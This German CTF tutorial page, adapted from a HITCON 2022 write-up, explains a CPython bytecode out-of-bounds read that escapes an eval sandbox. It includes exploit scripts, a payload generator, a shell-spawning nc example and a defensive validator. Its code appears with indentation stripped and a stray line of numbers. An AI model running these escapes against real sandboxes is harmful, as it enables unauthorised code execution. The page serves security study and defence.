# LOAD_NAME / LOAD_CONST opcode OOB Read

Diese Seite passt Splitlines ursprünglichen HITCON CTF 2022 „V O I D“-Writeup und die Exploit chain an.<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Ein `LOAD_NAME`- oder `LOAD_CONST`-Operand kann außerhalb eines absichtlich verkürzten `co_names`- oder `co_consts`-Tupels lesen. In dieser Challenge werden unerreichbare Dummy-Namen verwendet, bis ein nahegelegener Eintrag ein nützliches Attribut wie `__getattribute__` enthält.<sup>[[1]](#references)</sup>

Der verbleibende Payload verwendet diesen wiederhergestellten Namen erneut, um einen sandbox escape aufzubauen.<sup>[[1]](#references)</sup>

### Overview <a href="#overview-1" id="overview-1"></a>

Der Challenge-Wrapper ist kurz und kompiliert einen Ausdruck, bevor er ihn evaluiert:<sup>[[1]](#references)</sup>
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```
Der Input wird zu einem Python-Codeobjekt kompiliert. Anschließend ersetzt der Wrapper dessen `co_consts` und `co_names` durch leere Tupel, bevor `eval` aufgerufen wird.<sup>[[1]](#references)[[5]](#references)</sup>

Jede generierte Instruktion, die weiterhin einen dieser Tabellenindizes verwendet, kann den Interpreter zum Absturz bringen oder abhängig vom Build einen Zeiger auf ein angrenzendes Objekt offenlegen.<sup>[[1]](#references)</sup>

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Wie kommt es zum Segfault?

Für einen Listenausdruck wie `[a, b, c]` erzeugt der Compiler `LOAD_NAME`-Instruktionen mit aufeinanderfolgenden Operanden:<sup>[[1]](#references)[[2]](#references)</sup>
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE
```
Wenn `co_names` durch `()` ersetzt wird, enthält der Bytecode weiterhin `LOAD_NAME 2`; ein ungeprüfter Tuple-Zugriff kann daher einen Pointer außerhalb des Tuples abrufen, anstatt `IndexError` auszulösen.<sup>[[1]](#references)[[3]](#references)</sup>

`LOAD_NAME` und `LOAD_CONST` sind hier die zentralen Primitives: Ihre Integer-Operanden wählen jeweils Einträge in `co_names` und `co_consts` aus.<sup>[[1]](#references)[[2]](#references)</sup>

Beim Dispatch in CPython ruft `LOAD_CONST` den ausgewählten Tuple-Eintrag ab und legt ihn auf dem Stack ab; Release-Builds verwenden einen ungeprüften Tuple-Accessor:<sup>[[3]](#references)</sup>
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}
```
Prüfe zunehmende `LOAD_NAME`-Operanden auf dem Zielinterpreter, um nützliche Einträge zu ermitteln. Splitline beobachtete in der Challenge-Umgebung nützliche Offsets oberhalb von 700, aber das Layout ist build-spezifisch; ein Debugger kann dabei helfen, den umliegenden Speicher zu untersuchen.<sup>[[1]](#references)</sup>

### Exploit erstellen <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Sobald ein Offset einen nützlichen Namen liefert, platziere den Out-of-Range-Lookup in einem unerreichbaren Ausdruck und referenziere denselben `co_names`-Slot über einen erreichbaren Attributzugriff.<sup>[[1]](#references)</sup>

Wenn beispielsweise Offset 5 `__getattribute__` liefert, behalte diesen Namen in Slot 5, während der false branch den nützlichen Lookup ausführt:<sup>[[1]](#references)</sup>
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]
```
> Der wiederhergestellte Text muss nicht `__getattribute__` sein; jeder Bezeichner, der als payload dient, kann diesen Platz einnehmen.<sup>[[1]](#references)</sup>

Der Compiler verwendet bei wiederholten Vorkommen eines Namens denselben `co_names`-Slot, wie die Disassemblierung zeigt:<sup>[[1]](#references)[[2]](#references)</sup>
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE
```
Da `LOAD_ATTR` seinen Namen ebenfalls über `co_names` auflöst, kann der erreichbare branch diesen Slot wiederverwenden; gepackte Operanden in neueren CPython-Versionen werden in den unten stehenden Versionshinweisen beschrieben.<sup>[[1]](#references)[[2]](#references)</sup>

Kleine nichtnegative Ganzzahlen können ohne Konstanten aus booleschen Ausdrücken erzeugt werden:<sup>[[1]](#references)</sup>

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit-Skript <a href="#exploit-script-1" id="exploit-script-1"></a>

Der ursprüngliche Exploit verwendete Namen statt Konstanten, um innerhalb des Längenlimits der Challenge zu bleiben.<sup>[[1]](#references)</sup>

Dieser Helper durchsucht mögliche Name-Offsets, indem er ein Code-Objekt mit einem leeren `co_names`-Tuple erstellt.<sup>[[1]](#references)</sup>
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done
```
Der folgende Generator ordnet die wiederhergestellten Offsets Namen zu und erzeugt das Payload auf Quelltextebene.<sup>[[1]](#references)</sup>
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Auf hoher Ebene ruft der generierte Payload die Globals einer Funktion ab, stellt `builtins` wieder her und ruft `eval(input())` auf.<sup>[[1]](#references)</sup>
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Versionshinweise und betroffene Opcodes (Python 3.11–3.13)

- Unter CPython 3.11–3.13 verwenden Anweisungen weiterhin Integer-Operanden, um die Konstanten- und Namen-Tabellen des Codeobjekts zu indizieren. Wenn eines der Tupel kürzer als ein referenzierter Index ist, kann ein nicht geprüfter Zugriff einen benachbarten Objektzeiger lesen und einen Absturz verursachen oder auf diesem operieren; das genaue Verhalten hängt vom Interpreter-Build ab.<sup>[[2]](#references)[[3]](#references)</sup>
- `LOAD_CONST consti` und (ab 3.12) `RETURN_CONST consti` lesen `co_consts[consti]`.<sup>[[2]](#references)</sup>
- Direkte Benutzer der Namen-Tabelle sind unter anderem `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR` und (ab 3.12) `LOAD_FROM_DICT_OR_GLOBALS`.<sup>[[2]](#references)</sup>
- `LOAD_GLOBAL namei` und `LOAD_ATTR namei` verwenden `co_names[namei >> 1]`; das niederwertige Bit steuert das dokumentierte NULL-/method behavior. (Ab 3.12) verwendet `LOAD_SUPER_ATTR namei` `co_names[namei >> 2]` und speichert zwei Flags in seinen niederwertigen Bits.<sup>[[2]](#references)</sup>
- Python 3.11+ führte adaptive/inline caches ein, die versteckte `CACHE`-Einträge zwischen den Anweisungen hinzufügen. Handcrafted bytecode muss diese Einträge beim Erstellen von `co_code` berücksichtigen.<sup>[[2]](#references)</sup>

Praktische Auswirkung: Bytecode-Layout und wiederhergestellte Offsets sind release- und build-spezifisch. Teste die Technik und alle generierten Payloads gegen die Zielversion von CPython, bevor du dich darauf verlässt.<sup>[[2]](#references)</sup>

### Schneller Scanner für nützliche OOB-Indizes (kompatibel mit 3.11+/3.12+)

Wenn du interessante Objekte lieber direkt aus Bytecode statt aus High-Level-Quellcode untersuchen möchtest, kannst du minimale Codeobjekte generieren und Indizes per Brute-Force testen. Der folgende Helper fügt Inline-Caches entsprechend den `dis`-Metadaten des Zielinterpreters ein.<sup>[[2]](#references)</sup>
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notizen
- Um stattdessen Namen zu prüfen, ersetze `LOAD_CONST` durch `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` und passe die Stack-Nutzung sowie den gepackten Operanden für den Ziel-Opcode an.<sup>[[2]](#references)</sup>
- Verwende `EXTENDED_ARG` oder mehrere Bytes von `arg`, um bei Bedarf Indizes >255 zu erreichen. Dieser Helper gibt nur das niedrige Operanden-Byte aus, daher erfordern größere Indizes eine direkte Byte-Konstruktion oder mehrere Loads.<sup>[[2]](#references)</sup>

### Minimales Bytecode-only-RCE-Muster (co_consts OOB → builtins → eval/input)

Sobald du einen `co_consts`-Index identifiziert hast, der das builtins-Modul auflöst, kannst du `eval(input())` ohne `co_names` durch Manipulation des Stacks rekonstruieren. Das Material des offiziellen B01lers CTF 2024 `awpcode` dokumentiert dasselbe OOB-read-Muster.<sup>[[4]](#references)</sup>
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Dieser Stack-only-Ansatz ist nützlich, wenn eine Challenge dir direkte Kontrolle über `co_code` gibt und gleichzeitig `co_consts=()` sowie `co_names=()` erzwingt; er vermeidet Tricks auf Source-Ebene und kann Payloads klein halten, indem er Bytecode-Stack-Operationen und Tuple-Builder verwendet.<sup>[[4]](#references)</sup>

### Defensive Checks und Mitigations für Sandboxes

Wenn du eine Python-Sandbox schreibst, die nicht vertrauenswürdigen Code kompiliert oder evaluiert, solltest du dich nicht darauf verlassen, dass CPython die Grenzen von Tuple-Indizes prüft, die vom Bytecode verwendet werden. Validiere Code-Objekte, bevor du sie ausführst.<sup>[[2]](#references)[[3]](#references)</sup>

Praktischer Validator (weist OOB-Zugriff auf co_consts/co_names zurück).<sup>[[2]](#references)</sup>
```python
import dis

def max_name_index(code):
max_idx = -1
direct_name_ops = {
"LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
"IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
"LOAD_FROM_DICT_OR_GLOBALS",
}
for ins in dis.get_instructions(code):
if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
namei >>= 1
elif ins.opname == "LOAD_SUPER_ATTR":
namei >>= 2
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Zusätzliche Ideen zur Mitigation
- Erlaube keine beliebigen `CodeType.replace(...)`-Aufrufe mit nicht vertrauenswürdigen Eingaben, oder füge strenge strukturelle Prüfungen für das resultierende Code Object hinzu.
- Erwäge, nicht vertrauenswürdigen Code in einem separaten Prozess mit OS-level Sandboxing (seccomp, Job Objects, Containern) auszuführen, anstatt dich auf die CPython-Semantik zu verlassen.

## References

- [1] [Splitlines HITCON CTF 2022 writeup „V O I D“ (Ursprung dieser Technik und die übergeordnete Exploit-Kette)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Python-3.13-`dis`-Dokumentation (Bytecode-Indizes, gepackte Name-Operanden und Inline-Caches)](https://docs.python.org/3.13/library/dis.html)
- [3] [CPython-3.13.5-Tupelzugriffs-Makros (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
- [4] [B01lers-CTF-2024-`awpcode`-Challenge-Writeup (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
- [5] [Python-C-API: Code Objects](https://docs.python.org/3/c-api/code.html)
{{#include ../../../banners/hacktricks-training.md}}
